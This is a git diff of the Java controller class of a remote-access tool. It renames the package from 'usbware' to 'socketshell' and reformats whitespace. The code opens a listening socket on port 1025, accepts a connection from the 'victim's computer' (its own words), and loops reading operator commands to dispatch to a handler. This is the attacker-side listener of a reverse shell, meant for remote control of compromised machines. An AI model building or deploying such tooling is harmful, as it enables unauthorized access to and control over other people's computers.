@@ -1,5 +1,6 @@
-package com.github.thatcherdev.usbware.usbware;
+package com.github.thatcherdev.socketshell.shell;
 
+import com.github.thatcherdev.socketshell.SocketShell;
 import java.io.PrintWriter;
 import java.net.ServerSocket;
 import java.net.Socket;
@@ -20,31 +21,32 @@ public class Shell {
 	 */
 	public static void start() {
 		System.out.println("Connecting...\n");
-		try{
-			serverSocket=new ServerSocket(1025);
-			socket=serverSocket.accept();
-			in=new Scanner(socket.getInputStream());
-			out=new PrintWriter(socket.getOutputStream(), true);
+		try {
+			serverSocket = new ServerSocket(1025);
+			socket = serverSocket.accept();
+			in = new Scanner(socket.getInputStream());
+			out = new PrintWriter(socket.getOutputStream(), true);
 			System.out.println("Connection has been established");
 			System.out.println("Enter 'help' for a list of available commands");
-			while(true){
-				String command=USBware.getInput("");
+			while (true) {
+				String command = SocketShell.getInput("");
 				HandleCommand.handle(command);
 			}
-		}catch(Exception e){
-			if(e.getMessage().equals("String index out of range: -1"))
-				USBware.error("The victim's computer has disconnected");
+		} catch (Exception e) {
+			if (e.getMessage().equals("String index out of range: -1"))
+				SocketShell.error("The victim's computer has disconnected");
 			else
-				USBware.error(e.getMessage());
-		}finally{
-			try{
-				if(socket!=null)
+				SocketShell.error(e.getMessage());
+		} finally {
+			try {
+				if (socket != null)
 					socket.close();
-				if(in!=null)
+				if (in != null)
 					in.close();
-				if(out!=null)
+				if (out != null)
 					out.close();
-			}catch(Exception e){}
+			} catch (Exception e) {
+			}
 		}
 	}
 }
